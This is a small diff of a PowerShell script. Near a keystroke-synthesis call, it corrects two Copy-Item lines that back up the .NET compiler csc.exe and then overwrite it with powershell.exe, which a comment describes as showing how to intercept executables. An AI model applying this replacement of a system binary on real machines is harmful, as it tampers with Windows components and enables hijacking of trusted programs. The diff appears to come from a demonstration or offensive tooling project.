@@ -211,5 +211,5 @@
     [Synthesize_Keystrokes]::SendKeyStroke()
     
     <# Lines below are only here to show how to intercept executables, see further profile.ps1#>
-    Copy-Item -Path "$env:windir\\\Microsoft.NET\Framework\v4.0.30319\\csc.exe" -Destination Copy-Item -Path "$env:windir\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe.QPR" -Force
-    Copy-Item -Path "$env:windir\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe" -Destination Copy-Item -Path "$env:windir\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe" -Force
+    Copy-Item -Path "$env:windir\\\Microsoft.NET\Framework\v4.0.30319\\csc.exe" -Destination "$env:windir\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe.QPR" -Force
+    Copy-Item -Path "$env:windir\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe" -Destination "$env:windir\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe" -Force
